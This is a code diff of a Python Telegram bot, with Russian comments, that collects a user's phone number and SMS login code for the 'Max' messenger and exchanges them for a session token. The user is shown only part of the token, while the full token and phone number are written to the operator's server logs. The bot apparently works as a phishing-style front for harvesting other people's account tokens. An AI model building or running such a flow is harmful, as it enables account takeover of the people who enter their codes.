@@ -2,7 +2,7 @@ import asyncio
 import os
 import json
 import traceback
-from typing import Dict, Optional
+from typing import Dict
 
 from aiogram import Bot, Dispatcher, types
 from aiogram.filters import Command
@@ -39,7 +39,6 @@ class MaxAuth:
     
     def __init__(self):
         self.websocket = None
-        self.device_id = None
     
     async def connect(self):
         """Подключается к WebSocket Max"""
@@ -75,7 +74,7 @@ class MaxAuth:
         if "payload" not in data:
             raise Exception(f"Неожиданный ответ: {data}")
         
-        return data["payload"]  # здесь будет hash
+        return data["payload"]
     
     async def verify_code(self, auth_payload: dict, code: str) -> dict:
         """Подтверждает код, возвращает токен"""
@@ -97,11 +96,6 @@ class MaxAuth:
             raise Exception(f"Неожиданный ответ: {data}")
         
         return data["payload"]
-    
-    async def close(self):
-        """Закрывает соединение"""
-        if self.websocket:
-            await self.websocket.close()
 
 # ========== КОМАНДА /START ==========
 @dp.message(Command("start"))
@@ -120,7 +114,6 @@ async def process_phone(message: types.Message, state: FSMContext):
     phone = message.text.strip()
     user_id = message.from_user.id
     
-    # Проверка формата
     if not phone.startswith("+") or not phone[1:].isdigit():
         await message.answer("❌ Неверный формат. Пример: `+79123456789`", parse_mode="Markdown")
         return
@@ -128,14 +121,10 @@ async def process_phone(message: types.Message, state: FSMContext):
     await message.answer(f"📱 Отправляю запрос на номер {phone}...")
     
     try:
-        # Создаём клиент и подключаемся
         max_auth = MaxAuth()
         await max_auth.connect()
-        
-        # Отправляем номер, получаем hash
         auth_payload = await max_auth.send_code(phone)
         
-        # Сохраняем сессию
         temp_sessions[user_id] = {
             "max_auth": max_auth,
             "auth_payload": auth_payload,
@@ -156,7 +145,6 @@ async def process_code(message: types.Message, state: FSMContext):
     code = message.text.strip()
     user_id = message.from_user.id
     
-    # Проверяем сессию
     if user_id not in temp_sessions:
         await message.answer("❌ Сессия истекла. Начните заново с /start")
         await state.clear()
@@ -170,10 +158,8 @@ async def process_code(message: types.Message, state: FSMContext):
     await message.answer("🔐 Подтверждаю код...")
     
     try:
-        # Подтверждаем код, получаем токен
         result = await max_auth.verify_code(auth_payload, code)
         
-        # Извлекаем токен
         login_token = None
         if "tokenAttrs" in result and "LOGIN" in result["tokenAttrs"]:
             login_token = result["tokenAttrs"]["LOGIN"]["token"]
@@ -184,27 +170,20 @@ async def process_code(message: types.Message, state: FSMContext):
             await message.answer(f"❌ Не удалось получить токен. Ответ: {str(result)[:200]}")
             return
         
-        # Закрываем соединение
-        await max_auth.close()
-        
-        # Успех!
         await message.answer(
             f"✅ **Регистрация в Max успешна!**\n\n"
             f"📱 Номер: `{phone}`\n"
             f"🔑 Токен: `{login_token[:30]}...`\n\n"
-            f"⚠️ Сохраните этот токен для будущих входов.",
+            f"⚠️ Сохраните этот токен.",
             parse_mode="Markdown"
         )
         
-        # Выводим полный токен в консоль (логи Railway)
         print(f"\n{'='*50}")
-        print(f"✅ НОВЫЙ ПОЛЬЗОВАТЕЛЬ ЗАРЕГИСТРИРОВАН")
+        print(f"✅ НОВЫЙ ПОЛЬЗОВАТЕЛЬ")
         print(f"📱 Номер: {phone}")
         print(f"🔑 Токен: {login_token}")
-        print(f"🆔 User ID: {user_id}")
         print(f"{'='*50}\n")
         
-        # Очищаем сессию
         del temp_sessions[user_id]
         await state.clear()
         
